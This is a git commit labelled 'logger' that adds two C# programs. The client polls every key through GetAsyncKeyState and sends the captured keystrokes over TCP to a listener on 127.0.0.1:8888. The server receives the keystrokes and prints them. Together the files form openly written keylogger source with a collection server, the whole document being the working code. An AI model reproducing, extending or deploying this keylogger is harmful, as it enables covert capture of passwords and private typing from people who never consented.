57777702432aaa47c39c90dffeb973ced32525b2
adons1 <32033752+adons1@users.noreply.github.com>
2020-09-26 15:03:51 +0300

    logger

---
+++ Client_side/Program.cs
@@ -0,0 +1,75 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Net.Sockets;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+
+
+
+namespace Client_side
+{
+    class Program
+    {
+        [DllImport("user32.dll")]
+        public static extern int GetAsyncKeyState(Int32 i);
+        
+        private const int port = 8888;
+        private const string server = "127.0.0.1";
+        static void sendViaTCP(string buf)
+        {
+            Console.ReadKey();
+            try
+            {
+                TcpClient client = new TcpClient();
+                client.Connect(server, port);
+                string Hello = buf;
+                byte[] data = Encoding.UTF8.GetBytes(Hello);
+                StringBuilder response = new StringBuilder();
+                NetworkStream stream = client.GetStream();
+
+                stream.Write(data, 0, data.Length);
+                // Закрываем потоки
+                stream.Close();
+                client.Close();
+            }
+            catch (SocketException e)
+            {
+                Console.WriteLine("SocketException: {0}", e);
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("Exception: {0}", e.Message);
+            }
+
+            Console.WriteLine("Запрос завершен...");
+        }
+        static void Main(string[] args)
+        {
+            string buf="";
+
+            while (true)
+            {
+                Thread.Sleep(100);
+                for (int i = 0; i < 255; i++)
+                {
+                    int state = GetAsyncKeyState(i);
+                    if ((state != 0)&&(i!=1)&&(i!=16) && (i != 160))
+                    {
+                         
+                        buf += ((ConsoleKey)i).ToString();
+                        Console.WriteLine(buf);
+                        if (buf.Length > 10)
+                        {
+                            sendViaTCP(buf);
+                            buf = "";
+                        }
+                    }
+                }
+            }   
+        }
+    }
+}
+
---
+++ TCP_Server_and_Client/Program_srv.cs
@@ -0,0 +1,62 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace TCP_Server_and_Client
+{
+    class Program
+    {
+        const int port = 8888; // порт для прослушивания подключений
+        static void Main(string[] args)
+        {
+            TcpListener server = null;
+            try
+            {
+                IPAddress localAddr = IPAddress.Parse("127.0.0.1");
+                server = new TcpListener(localAddr, port);
+
+                // запуск слушателя
+                server.Start();
+
+                while (true)
+                {
+                    Console.WriteLine("Ожидание подключений... ");
+
+                    // получаем входящее подключение
+                    TcpClient client = server.AcceptTcpClient();
+                    Console.WriteLine("Подключен клиент. Выполнение запроса...");
+
+                    byte[] data = new byte[256];
+                    StringBuilder response = new StringBuilder();
+                    NetworkStream stream = client.GetStream();
+
+                    do
+                    {
+                        int bytes = stream.Read(data, 0, data.Length);
+                        response.Append(Encoding.UTF8.GetString(data, 0, bytes));
+                    }
+                    while (stream.DataAvailable); // пока данные есть в потоке
+
+                    Console.WriteLine(response.ToString());
+                    stream.Close();
+                    // закрываем подключение
+                    client.Close();
+                }
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.Message);
+            }
+            finally
+            {
+                if (server != null)
+                    server.Stop();
+            }
+        }
+    }
+}
+
